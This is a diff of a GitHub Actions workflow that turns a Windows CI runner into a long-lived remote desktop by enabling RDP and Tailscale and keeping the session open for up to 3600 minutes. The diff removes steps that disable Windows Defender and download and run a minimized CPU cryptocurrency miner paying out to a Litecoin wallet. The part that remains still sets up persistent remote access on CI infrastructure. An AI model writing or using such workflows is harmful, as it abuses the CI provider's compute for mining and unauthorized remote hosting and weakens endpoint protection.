@@ -9,7 +9,6 @@ jobs:
     timeout-minutes: 3600
 
     steps:
-      # --- RDP & Tailscale Setup ---
       - name: Configure Core RDP Settings
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
@@ -78,32 +77,6 @@ jobs:
           }
           Write-Host "TCP connectivity successful!"
 
-      # --- Disable Windows Defender Real-Time Protection (optional) ---
-      - name: Disable Windows Defender Real-Time Protection
-        run: |
-          Set-MpPreference -DisableRealtimeMonitoring $true
-        continue-on-error: true
-
-      # --- Install 7-Zip ---
-      - name: Install 7-Zip
-        run: |
-          $url = "https://www.7-zip.org/a/7z2301-x64.exe"
-          $installer = "$env:TEMP\7z2301-x64.exe"
-          Invoke-WebRequest -Uri $url -OutFile $installer
-          Start-Process -FilePath $installer -ArgumentList "/S" -Wait
-
-      # --- Install & Run Unmineable Miner (CPU, Litecoin) ---
-      - name: Install & Run Unmineable Miner (CPU, LTC)
-        run: |
-          $minerUrl = "https://github.com/UnmineableMiner/UnmineableMiner/releases/latest/download/UnmineableMiner.zip"
-          $zipPath = "$env:TEMP\UnmineableMiner.zip"
-          $extractPath = "C:\UnmineableMiner"
-          Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath
-          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
-          Remove-Item $zipPath
-          Start-Process -FilePath "$extractPath\UnmineableMiner.exe" -ArgumentList "--algorithm=rx", "--worker=GitHubRunner", "--coin=LTC", "--address=LNRU4LhMqkLiEPmhAgquNqnztJkCrpik7J", "--cpu" -WindowStyle Minimized
-
-      # --- Maintain Connection (Graceful Stop for Shutdown) ---
       - name: Maintain Connection (Graceful Stop)
         run: |
           Write-Host "`n=== RDP ACCESS ==="
